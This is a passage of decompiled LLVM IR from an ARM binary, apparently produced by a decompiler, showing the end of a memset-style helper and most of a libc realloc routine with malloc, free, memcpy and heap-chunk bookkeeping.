  %v0_2944c = call i32 @__GI_memset()
  br label %.thread

dec_label_pc_29454:                               ; preds = %dec_label_pc_29438
  %tmp7 = icmp eq i32 %v1_2943c, 16
  %v2_29458 = inttoptr i32 %v1_29420 to i32*
  store i32 0, i32* %v2_29458, align 4
  %v0_2945c = load i32, i32* @r1, align 4
  %v1_2945c = load i32, i32* %r4.global-to-local, align 4
  %v2_2945c = add i32 %v1_2945c, 4
  %v3_2945c = inttoptr i32 %v2_2945c to i32*
  store i32 %v0_2945c, i32* %v3_2945c, align 4
  %v0_29460 = load i32, i32* @r1, align 4
  %v1_29460 = load i32, i32* %r4.global-to-local, align 4
  %v2_29460 = add i32 %v1_29460, 8
  %v3_29460 = inttoptr i32 %v2_29460 to i32*
  store i32 %v0_29460, i32* %v3_29460, align 4
  %v2_29464 = icmp ult i32 %v1_2943c, 13
  %v3_29464 = or i1 %tmp7, %v2_29464
  br i1 %v3_29464, label %.thread, label %dec_label_pc_29468

dec_label_pc_29468:                               ; preds = %dec_label_pc_29454
  %v0_29468 = load i32, i32* %ip.global-to-local, align 4
  %v0_2946c = load i32, i32* @r1, align 4
  %v1_2946c = load i32, i32* %r4.global-to-local, align 4
  %v2_2946c = add i32 %v1_2946c, 12
  %v3_2946c = inttoptr i32 %v2_2946c to i32*
  store i32 %v0_2946c, i32* %v3_2946c, align 4
  %v0_29470 = load i32, i32* @r1, align 4
  %v1_29470 = load i32, i32* %r4.global-to-local, align 4
  %v2_29470 = add i32 %v1_29470, 16
  %v3_29470 = inttoptr i32 %v2_29470 to i32*
  store i32 %v0_29470, i32* %v3_29470, align 4
  %tmp8 = icmp ult i32 %v0_29468, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_29478

dec_label_pc_29478:                               ; preds = %dec_label_pc_29468
  %v0_29478 = load i32, i32* %ip.global-to-local, align 4
  %v7_29478 = icmp eq i32 %v0_29478, 9
  %v0_2947c = load i32, i32* @r1, align 4
  %v1_2947c = load i32, i32* %r4.global-to-local, align 4
  %v2_2947c = add i32 %v1_2947c, 20
  %v3_2947c = inttoptr i32 %v2_2947c to i32*
  store i32 %v0_2947c, i32* %v3_2947c, align 4
  %v0_29480 = load i32, i32* @r1, align 4
  %v1_29480 = load i32, i32* %r4.global-to-local, align 4
  %v2_29480 = add i32 %v1_29480, 24
  %v3_29480 = inttoptr i32 %v2_29480 to i32*
  store i32 %v0_29480, i32* %v3_29480, align 4
  br i1 %v7_29478, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_29478
  %v1_29484 = load i32, i32* @r1, align 4
  %v2_29484 = load i32, i32* %r4.global-to-local, align 4
  %v3_29484 = add i32 %v2_29484, 32
  %v4_29484 = inttoptr i32 %v3_29484 to i32*
  store i32 %v1_29484, i32* %v4_29484, align 4
  %v1_29488 = load i32, i32* @r1, align 4
  %v2_29488 = load i32, i32* %r4.global-to-local, align 4
  %v3_29488 = add i32 %v2_29488, 28
  %v4_29488 = inttoptr i32 %v3_29488 to i32*
  store i32 %v1_29488, i32* %v4_29488, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_29478, %dec_label_pc_2942c, %dec_label_pc_29468, %dec_label_pc_29454, %dec_label_pc_293e0, %dec_label_pc_2944c, %bb
  store i32 1, i32* @r1, align 4
  %v0_29498 = load i32, i32* @r5, align 4
  %v2_29498 = add i32 %v0_29498, 76
  %v3_29498 = inttoptr i32 %v2_29498 to i32*
  %v4_29498 = load i32, i32* %v3_29498, align 4
  store i32 %v4_29498, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_29498)
  br label %dec_label_pc_294a4

dec_label_pc_294a4:                               ; preds = %dec_label_pc_293cc, %.thread
  %v0_294a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_29398, i32* @r4, align 4
  store i32 %v6_29398, i32* @r5, align 4
  store i32 %v9_29398, i32* @r6, align 4
  store i32 %v12_29398, i32* @lr, align 4
  ret i32 %v0_294a4

; uselistorder directives
  uselistorder i32 %v1_2943c, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_294a4, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_294b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_294b8:
  %v0_294b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_294b8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_294b8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_294b8, %bb
  %v4_294c8 = phi i32 [ %arg1, %dec_label_pc_294b8 ], [ 0, %bb ]
  ret i32 %v4_294c8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_294cc = load i32, i32* @r4, align 4
  %v6_294cc = load i32, i32* @r5, align 4
  %v9_294cc = load i32, i32* @r6, align 4
  %v12_294cc = load i32, i32* @r7, align 4
  %v15_294cc = load i32, i32* @r8, align 4
  %v18_294cc = load i32, i32* @sb, align 4
  %v21_294cc = load i32, i32* @sl, align 4
  %v24_294cc = load i32, i32* @fp, align 4
  %v27_294cc = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_294d8 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_294d8, label %dec_label_pc_294ec, label %dec_label_pc_294fc

dec_label_pc_294ec:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_294f0 = call i32 @malloc(i32 %arg2)
  store i32 %v1_294f0, i32* %r0.global-to-local, align 4
  store i32 %v1_294f0, i32* @r4, align 4
  br label %dec_label_pc_29854

dec_label_pc_294fc:                               ; preds = %entry
  %v2_294fc = icmp eq i32 %arg2, 0
  br i1 %v2_294fc, label %dec_label_pc_29504, label %dec_label_pc_29510

dec_label_pc_29504:                               ; preds = %dec_label_pc_294fc
  %v0_29504 = call i32 @free()
  store i32 %v0_29504, i32* %r0.global-to-local, align 4
  %v0_29508 = load i32, i32* @r6, align 4
  store i32 %v0_29508, i32* @r4, align 4
  br label %dec_label_pc_29854

dec_label_pc_29510:                               ; preds = %dec_label_pc_294fc
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_29518 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 156) to i32*), align 4
  store i32 %v4_29518, i32* @r4, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %v4_29518, i32* %r2.global-to-local, align 4
  %v4_29524 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_29524, i32* %r1.global-to-local, align 4
  %v2_29528 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_29528, i32* %r0.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_29530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_29530)
  %v0_2953c = load i32, i32* @r4, align 4
  store i32 %v0_2953c, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_29548 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), align 4
  store i32 %v4_29548, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_29554.1771 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29548)
  %v0_29554 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_29554, -32
  br i1 %tmp36, label %dec_label_pc_29570, label %dec_label_pc_2955c

dec_label_pc_2955c:                               ; preds = %dec_label_pc_29510
  %v0_2955c = call i32 @__GI___errno_location()
  store i32 %v0_2955c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_29568 = inttoptr i32 %v0_2955c to i32*
  store i32 12, i32* %v2_29568, align 4
  br label %dec_label_pc_29854

dec_label_pc_29570:                               ; preds = %dec_label_pc_29510
  %v1_29570 = add i32 %v0_29554, 11
  store i32 %v1_29570, i32* %r0.global-to-local, align 4
  %v0_29574 = load i32, i32* @r5, align 4
  %v1_29574 = add i32 %v0_29574, -4
  %v2_29574 = inttoptr i32 %v1_29574 to i32*
  %v3_29574 = load i32, i32* %v2_29574, align 4
  store i32 %v3_29574, i32* %r2.global-to-local, align 4
  %v2_29578 = icmp ugt i32 %v1_29570, 14
  %v7_29578 = icmp eq i32 %v1_29570, 15
  %v2_2957c = xor i1 %v2_29578, true
  %v3_2957c = or i1 %v7_29578, %v2_2957c
  br i1 %v3_2957c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_29570
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_29570, %bb
  %v2_29580 = xor i1 %v7_29578, true
  %v3_29580 = and i1 %v2_29578, %v2_29580
  br i1 %v3_29580, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_29580 = and i32 %v1_29570, -8
  store i32 %v5_29580, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_29584 = and i32 %v3_29574, 2
  %v2_29584 = icmp eq i32 %v1_29584, 0
  %v1_29588 = add i32 %v0_29574, -8
  store i32 %v1_29588, i32* @sl, align 4
  %v1_2958c = and i32 %v3_29574, -4
  store i32 %v1_2958c, i32* @r6, align 4
  br i1 %v2_29584, label %dec_label_pc_29594, label %dec_label_pc_2976c

dec_label_pc_29594:                               ; preds = %bb29
  %v1_29594 = load i32, i32* @sb, align 4
  %v3_29594 = icmp ult i32 %v1_2958c, %v1_29594
  br i1 %v3_29594, label %dec_label_pc_295a0, label %bb30

bb30:                                             ; preds = %dec_label_pc_29594
  store i32 %v1_2958c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29704

dec_label_pc_295a0:                               ; preds = %dec_label_pc_29594
  store i32 92, i32* %r3.global-to-local, align 4
  %v4_295a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_295a8, i32* %r0.global-to-local, align 4
  %v1_295ac = add i32 %v4_295a8, 44
  %v2_295ac = inttoptr i32 %v1_295ac to i32*
  %v3_295ac = load i32, i32* %v2_295ac, align 4
  store i32 %v3_295ac, i32* %r3.global-to-local, align 4
  %v2_295b0 = add i32 %v1_2958c, %v1_29588
  store i32 %v2_295b0, i32* @r4, align 4
  %v9_295b4 = icmp eq i32 %v2_295b0, %v3_295ac
  %v1_295b8 = add i32 %v2_295b0, 4
  %v2_295b8 = inttoptr i32 %v1_295b8 to i32*
  %v3_295b8 = load i32, i32* %v2_295b8, align 4
  store i32 %v3_295b8, i32* %r1.global-to-local, align 4
  br i1 %v9_295b4, label %dec_label_pc_295c0, label %dec_label_pc_295fc

dec_label_pc_295c0:                               ; preds = %dec_label_pc_295a0
  %v1_295c0 = and i32 %v3_295b8, -4
  %v2_295c4 = add i32 %v1_295c0, %v1_2958c
  store i32 %v2_295c4, i32* %r1.global-to-local, align 4
  %v1_295c8 = add i32 %v1_29594, 16
  store i32 %v1_295c8, i32* %r3.global-to-local, align 4
  %v3_295cc = icmp ult i32 %v2_295c4, %v1_295c8
  br i1 %v3_295cc, label %dec_label_pc_29650, label %dec_label_pc_295d4

dec_label_pc_295d4:                               ; preds = %dec_label_pc_295c0
  %v2_295d4 = sub i32 %v2_295c4, %v1_29594
  %v1_295d8 = urem i32 %v3_29574, 2
  %v2_295dc = add i32 %v1_29594, %v1_29588
  store i32 %v2_295dc, i32* %r1.global-to-local, align 4
  %v2_295e0 = or i32 %v1_29594, %v1_295d8
  store i32 %v2_295e0, i32* %r2.global-to-local, align 4
  %v1_295e4 = or i32 %v2_295d4, 1
  store i32 %v1_295e4, i32* %r3.global-to-local, align 4
  store i32 %v0_29574, i32* @r4, align 4
  store i32 %v2_295e0, i32* %v2_29574, align 4
  %v0_295f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_295f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_295f0 = add i32 %v1_295f0, 44
  %v3_295f0 = inttoptr i32 %v2_295f0 to i32*
  store i32 %v0_295f0, i32* %v3_295f0, align 4
  %v0_295f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_295f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_295f4 = add i32 %v1_295f4, 4
  %v3_295f4 = inttoptr i32 %v2_295f4 to i32*
  store i32 %v0_295f4, i32* %v3_295f4, align 4
  br label %dec_label_pc_29838

dec_label_pc_295fc:                               ; preds = %dec_label_pc_295a0
  %v1_295fc = and i32 %v3_295b8, -2
  %v2_29600 = add i32 %v1_295fc, %v2_295b0
  store i32 %v2_29600, i32* %r3.global-to-local, align 4
  %v1_29604 = add i32 %v2_29600, 4
  %v2_29604 = inttoptr i32 %v1_29604 to i32*
  %v3_29604 = load i32, i32* %v2_29604, align 4
  store i32 %v3_29604, i32* %r3.global-to-local, align 4
  %v1_29608 = urem i32 %v3_29604, 2
  %v2_29608 = icmp eq i32 %v1_29608, 0
  br i1 %v2_29608, label %dec_label_pc_29610, label %dec_label_pc_29650

dec_label_pc_29610:                               ; preds = %dec_label_pc_295fc
  %v1_29610 = and i32 %v3_295b8, -4
  store i32 %v1_29610, i32* %r3.global-to-local, align 4
  %v2_29614 = add i32 %v1_29610, %v1_2958c
  store i32 %v2_29614, i32* %r0.global-to-local, align 4
  %v3_29618 = icmp ult i32 %v2_29614, %v1_29594
  br i1 %v3_29618, label %dec_label_pc_29650, label %dec_label_pc_29620

dec_label_pc_29620:                               ; preds = %dec_label_pc_29610
  %v1_29620 = add i32 %v1_2958c, %v0_29574
  %v2_29620 = inttoptr i32 %v1_29620 to i32*
  %v3_29620 = load i32, i32* %v2_29620, align 4
  store i32 %v3_29620, i32* %r1.global-to-local, align 4
  %v1_29624 = add i32 %v3_29620, 12
  %v2_29624 = inttoptr i32 %v1_29624 to i32*
  %v3_29624 = load i32, i32* %v2_29624, align 4
  store i32 %v3_29624, i32* %r3.global-to-local, align 4
  %v9_29628 = icmp eq i32 %v3_29624, %v2_295b0
  %v1_2962c = add i32 %v2_295b0, 12
  %v2_2962c = inttoptr i32 %v1_2962c to i32*
  %v3_2962c = load i32, i32* %v2_2962c, align 4
  store i32 %v3_2962c, i32* %r2.global-to-local, align 4
  br i1 %v9_29628, label %dec_label_pc_29634, label %dec_label_pc_29640

dec_label_pc_29634:                               ; preds = %dec_label_pc_29620
  %v1_29634 = add i32 %v3_2962c, 8
  %v2_29634 = inttoptr i32 %v1_29634 to i32*
  %v3_29634 = load i32, i32* %v2_29634, align 4
  store i32 %v3_29634, i32* %r3.global-to-local, align 4
  %v9_29638 = icmp eq i32 %v3_29634, %v2_295b0
  br i1 %v9_29638, label %dec_label_pc_29644, label %dec_label_pc_29640

dec_label_pc_29640:                               ; preds = %dec_label_pc_29620, %dec_label_pc_29634
  %v0_29640 = call i32 @abort()
  store i32 %v0_29640, i32* %r0.global-to-local, align 4
  %v0_29644.pre = load i32, i32* @r1, align 4
  %v1_29644.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_29644

dec_label_pc_29644:                               ; preds = %dec_label_pc_29634, %dec_label_pc_29640
  %v1_29644 = phi i32 [ %v3_2962c, %dec_label_pc_29634 ], [ %v1_29644.pre, %dec_label_pc_29640 ]
  %v0_29644 = phi i32 [ %v3_29620, %dec_label_pc_29634 ], [ %v0_29644.pre, %dec_label_pc_29640 ]
  %v2_29644 = add i32 %v1_29644, 8
  %v3_29644 = inttoptr i32 %v2_29644 to i32*
  store i32 %v0_29644, i32* %v3_29644, align 4
  %v0_29648 = load i32, i32* %r2.global-to-local, align 4
  %v1_29648 = load i32, i32* %r1.global-to-local, align 4
  %v2_29648 = add i32 %v1_29648, 12
  %v3_29648 = inttoptr i32 %v2_29648 to i32*
  store i32 %v0_29648, i32* %v3_29648, align 4
  %v1_29704.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29704

dec_label_pc_29650:                               ; preds = %dec_label_pc_295c0, %dec_label_pc_29610, %dec_label_pc_295fc
  %v1_29650 = add i32 %v1_29594, -7
  store i32 %v1_29650, i32* %r0.global-to-local, align 4
  %v1_29654 = call i32 @malloc(i32 %v1_29650)
  store i32 %v1_29654, i32* @r0, align 4
  store i32 %v1_29654, i32* %r1.global-to-local, align 4
  %v2_29658 = icmp eq i32 %v1_29654, 0
  br i1 %v2_29658, label %bb31, label %dec_label_pc_29664

bb31:                                             ; preds = %dec_label_pc_29650
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_29838

dec_label_pc_29664:                               ; preds = %dec_label_pc_29650
  %v1_2966c.pre = load i32, i32* @r4, align 4
  %v1_29664 = add i32 %v1_29654, -4
  %v2_29664 = inttoptr i32 %v1_29664 to i32*
  %v3_29664 = load i32, i32* %v2_29664, align 4
  store i32 %v3_29664, i32* @r3, align 4
  %v1_29668 = add i32 %v1_29654, -8
  store i32 %v1_29668, i32* @r7, align 4
  %v9_2966c = icmp eq i32 %v1_29668, %v1_2966c.pre
  br i1 %v9_2966c, label %.thread2, label %dec_label_pc_2967c

.thread2:                                         ; preds = %dec_label_pc_29664
  %v2_29670 = and i32 %v3_29664, -4
  store i32 %v2_29670, i32* %r3.global-to-local, align 4
  %v2_29674 = load i32, i32* @r6, align 4
  %v3_29674 = add i32 %v2_29674, %v2_29670
  store i32 %v3_29674, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29704

dec_label_pc_2967c:                               ; preds = %dec_label_pc_29664
  %v0_2967c = load i32, i32* @r6, align 4
  %v1_2967c = add i32 %v0_2967c, -4
  store i32 %v1_2967c, i32* @r2, align 4
  %v3_29680 = udiv i32 %v1_2967c, 4
  store i32 %v3_29680, i32* @ip, align 4
  %tmp37 = and i32 %v1_2967c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_29688 = icmp ult i32 %v1_2967c, 36
  %v3_29688 = or i1 %tmp38, %v2_29688
  %v0_29698 = load i32, i32* @r5, align 4
  br i1 %v3_29688, label %dec_label_pc_29698, label %dec_label_pc_2968c

dec_label_pc_2968c:                               ; preds = %dec_label_pc_2967c
  store i32 %v0_29698, i32* @r1, align 4
  %v0_29690 = call i32 @memcpy()
  store i32 %v0_29690, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_29698:                               ; preds = %dec_label_pc_2967c
  %v1_29698 = inttoptr i32 %v0_29698 to i32*
  %v2_29698 = load i32, i32* %v1_29698, align 4
  store i32 %v2_29698, i32* %r3.global-to-local, align 4
  %v2_2969c = inttoptr i32 %v1_29654 to i32*
  store i32 %v2_29698, i32* %v2_2969c, align 4
  %v0_296a0 = load i32, i32* @r5, align 4
  %v1_296a0 = add i32 %v0_296a0, 4
  %v2_296a0 = inttoptr i32 %v1_296a0 to i32*
  %v3_296a0 = load i32, i32* %v2_296a0, align 4
  store i32 %v3_296a0, i32* %r3.global-to-local, align 4
  %v1_296a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_296a4 = add i32 %v1_296a4, 4
  %v3_296a4 = inttoptr i32 %v2_296a4 to i32*
  store i32 %v3_296a0, i32* %v3_296a4, align 4
  %v0_296a8 = load i32, i32* @r5, align 4
  %v1_296a8 = add i32 %v0_296a8, 8
  %v2_296a8 = inttoptr i32 %v1_296a8 to i32*
  %v3_296a8 = load i32, i32* %v2_296a8, align 4
  store i32 %v3_296a8, i32* %r3.global-to-local, align 4
  %v0_296ac = load i32, i32* @ip, align 4
  %v1_296b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_296b0 = add i32 %v1_296b0, 8
  %v3_296b0 = inttoptr i32 %v2_296b0 to i32*
  store i32 %v3_296a8, i32* %v3_296b0, align 4
  %tmp39 = icmp ult i32 %v0_296ac, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_296b8

dec_label_pc_296b8:                               ; preds = %dec_label_pc_29698
  %v0_296b8 = load i32, i32* @r5, align 4
  %v1_296b8 = add i32 %v0_296b8, 12
  %v2_296b8 = inttoptr i32 %v1_296b8 to i32*
  %v3_296b8 = load i32, i32* %v2_296b8, align 4
  store i32 %v3_296b8, i32* %r3.global-to-local, align 4
  %v1_296bc = load i32, i32* %r1.global-to-local, align 4
  %v2_296bc = add i32 %v1_296bc, 12
  %v3_296bc = inttoptr i32 %v2_296bc to i32*
  store i32 %v3_296b8, i32* %v3_296bc, align 4
  %v0_296c0 = load i32, i32* @r5, align 4
  %v1_296c0 = add i32 %v0_296c0, 16
  %v2_296c0 = inttoptr i32 %v1_296c0 to i32*
  %v3_296c0 = load i32, i32* %v2_296c0, align 4
  store i32 %v3_296c0, i32* %r3.global-to-local, align 4
  %v0_296c4 = load i32, i32* @ip, align 4
  %v1_296c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_296c8 = add i32 %v1_296c8, 16
  %v3_296c8 = inttoptr i32 %v2_296c8 to i32*
  store i32 %v3_296c0, i32* %v3_296c8, align 4
  %tmp40 = icmp ult i32 %v0_296c4, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_296d0

dec_label_pc_296d0:                               ; preds = %dec_label_pc_296b8
  %v0_296d0 = load i32, i32* @r5, align 4
  %v1_296d0 = add i32 %v0_296d0, 20
  %v2_296d0 = inttoptr i32 %v1_296d0 to i32*
  %v3_296d0 = load i32, i32* %v2_296d0, align 4
  store i32 %v3_296d0, i32* %r3.global-to-local, align 4
  %v1_296d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_296d4 = add i32 %v1_296d4, 20
  %v3_296d4 = inttoptr i32 %v2_296d4 to i32*
  store i32 %v3_296d0, i32* %v3_296d4, align 4
  %v0_296d8 = load i32, i32* @r5, align 4
  %v1_296d8 = add i32 %v0_296d8, 24
  %v2_296d8 = inttoptr i32 %v1_296d8 to i32*
  %v3_296d8 = load i32, i32* %v2_296d8, align 4
  store i32 %v3_296d8, i32* %r3.global-to-local, align 4
  %v1_296dc = load i32, i32* %r1.global-to-local, align 4
  %v2_296dc = add i32 %v1_296dc, 24
  %v3_296dc = inttoptr i32 %v2_296dc to i32*
  store i32 %v3_296d8, i32* %v3_296dc, align 4
  %v0_296e0 = load i32, i32* @ip, align 4
  %v7_296e0 = icmp eq i32 %v0_296e0, 9
  br i1 %v7_296e0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_296d0
  %v1_296e4 = load i32, i32* @r5, align 4
  %v2_296e4 = add i32 %v1_296e4, 28
  %v3_296e4 = inttoptr i32 %v2_296e4 to i32*
  %v4_296e4 = load i32, i32* %v3_296e4, align 4
  store i32 %v4_296e4, i32* %r3.global-to-local, align 4
  %v2_296e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_296e8 = add i32 %v2_296e8, 28
  %v4_296e8 = inttoptr i32 %v3_296e8 to i32*
  store i32 %v4_296e4, i32* %v4_296e8, align 4
  %v1_296ec = load i32, i32* @r5, align 4
  %v2_296ec = add i32 %v1_296ec, 32
  %v3_296ec = inttoptr i32 %v2_296ec to i32*
  %v4_296ec = load i32, i32* %v3_296ec, align 4
  store i32 %v4_296ec, i32* %r3.global-to-local, align 4
  %v2_296f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_296f0 = add i32 %v2_296f0, 32
  %v4_296f0 = inttoptr i32 %v3_296f0 to i32*
  store i32 %v4_296ec, i32* %v4_296f0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_296d0, %dec_label_pc_296b8, %dec_label_pc_29698, %dec_label_pc_2968c, %bb32
  %v0_296f4 = load i32, i32* @r5, align 4
  store i32 %v0_296f4, i32* @r0, align 4
  %v0_296f8 = call i32 @free()
  store i32 %v0_296f8, i32* %r0.global-to-local, align 4
  %v0_296fc = load i32, i32* @r7, align 4
  %v1_296fc = add i32 %v0_296fc, 8
  store i32 %v1_296fc, i32* @r4, align 4
  br label %dec_label_pc_29838

dec_label_pc_29704:                               ; preds = %bb30, %.thread2, %dec_label_pc_29644
  %v0_29718 = phi i32 [ %v3_29674, %.thread2 ], [ %v1_2958c, %bb30 ], [ %v1_29704.pre, %dec_label_pc_29644 ]
  %v0_29704 = load i32, i32* @sb, align 4
  %v2_29704 = sub i32 %v0_29718, %v0_29704
  store i32 %v2_29704, i32* %r1.global-to-local, align 4
  %v0_2970c = load i32, i32* @sl, align 4
  %v1_2970c = add i32 %v0_2970c, 4
  %v2_2970c = inttoptr i32 %v1_2970c to i32*
  %v3_2970c = load i32, i32* %v2_2970c, align 4
  %tmp41 = icmp ugt i32 %v2_29704, 15
  %v1_29734 = urem i32 %v3_2970c, 2
  store i32 %v1_29734, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_29734, label %dec_label_pc_29714

dec_label_pc_29714:                               ; preds = %dec_label_pc_29704
  %v2_29718 = or i32 %v1_29734, %v0_29718
  store i32 %v2_29718, i32* %r3.global-to-local, align 4
  store i32 %v2_29718, i32* %v2_2970c, align 4
  %v0_29720 = load i32, i32* @sl, align 4
  %v1_29720 = load i32, i32* %r0.global-to-local, align 4
  %v2_29720 = add i32 %v1_29720, %v0_29720
  store i32 %v2_29720, i32* %r2.global-to-local, align 4
  %v1_29724 = add i32 %v2_29720, 4
  %v2_29724 = inttoptr i32 %v1_29724 to i32*
  %v3_29724 = load i32, i32* %v2_29724, align 4
  %v1_29728 = or i32 %v3_29724, 1
  store i32 %v1_29728, i32* %r3.global-to-local, align 4
  store i32 %v1_29728, i32* %v2_29724, align 4
  br label %dec_label_pc_29764

dec_label_pc_29734:                               ; preds = %dec_label_pc_29704
  %v2_29738 = add i32 %v0_2970c, %v0_29704
  store i32 %v2_29738, i32* %r0.global-to-local, align 4
  %v2_2973c = or i32 %v1_29734, %v0_29704
  store i32 %v2_2973c, i32* %r3.global-to-local, align 4
  %v1_29740 = or i32 %v2_29704, 1
  store i32 %v1_29740, i32* %r2.global-to-local, align 4
  store i32 %v2_2973c, i32* %v2_2970c, align 4
  %v0_29748 = load i32, i32* %r2.global-to-local, align 4
  %v1_29748 = load i32, i32* %r0.global-to-local, align 4
  %v2_29748 = add i32 %v1_29748, 4
  %v3_29748 = inttoptr i32 %v2_29748 to i32*
  store i32 %v0_29748, i32* %v3_29748, align 4
  %v0_2974c = load i32, i32* %r0.global-to-local, align 4
  %v1_2974c = load i32, i32* %r1.global-to-local, align 4
  %v2_2974c = add i32 %v1_2974c, %v0_2974c
  store i32 %v2_2974c, i32* %r2.global-to-local, align 4
  %v1_29750 = add i32 %v2_2974c, 4
  %v2_29750 = inttoptr i32 %v1_29750 to i32*
  %v3_29750 = load i32, i32* %v2_29750, align 4
  %v1_29754 = or i32 %v3_29750, 1
  store i32 %v1_29754, i32* %r3.global-to-local, align 4
  store i32 %v1_29754, i32* %v2_29750, align 4
  %v0_2975c = load i32, i32* %r0.global-to-local, align 4
  %v1_2975c = add i32 %v0_2975c, 8
  store i32 %v1_2975c, i32* @r0, align 4
  %v0_29760 = call i32 @free()
  store i32 %v0_29760, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29764

dec_label_pc_29764:                               ; preds = %dec_label_pc_29714, %dec_label_pc_29734
  %v0_29764 = load i32, i32* @sl, align 4
  %v1_29764 = add i32 %v0_29764, 8
  store i32 %v1_29764, i32* @r4, align 4
  br label %dec_label_pc_29838

dec_label_pc_2976c:                               ; preds = %bb29
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_29774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29774, i32* @r8, align 4
  %v2_29778 = inttoptr i32 %v1_29588 to i32*
  %v3_29778 = load i32, i32* %v2_29778, align 4
  store i32 %v3_29778, i32* @r4, align 4
  %v1_2977c = add i32 %v4_29774, 860
  %v2_2977c = inttoptr i32 %v1_2977c to i32*
  %v3_2977c = load i32, i32* %v2_2977c, align 4
  %v1_29780 = add i32 %v3_29778, 4
  %v1_29784 = add i32 %v3_2977c, -1
  store i32 %v1_29784, i32* %r2.global-to-local, align 4
  %v2_29788 = add i32 %v1_29780, %v1_29784
  %v1_2978c = load i32, i32* @sb, align 4
  %v2_2978c = add i32 %v2_29788, %v1_2978c
  store i32 %v2_2978c, i32* %r3.global-to-local, align 4
  %v2_29790 = sub i32 0, %v3_2977c
  %v3_29790 = and i32 %v2_2978c, %v2_29790
  store i32 %v3_29790, i32* @r7, align 4
  %v2_29794 = sub i32 %v3_29790, %v3_29778
  store i32 %v2_29794, i32* @fp, align 4
  %v9_29798 = icmp eq i32 %v1_2958c, %v2_29794
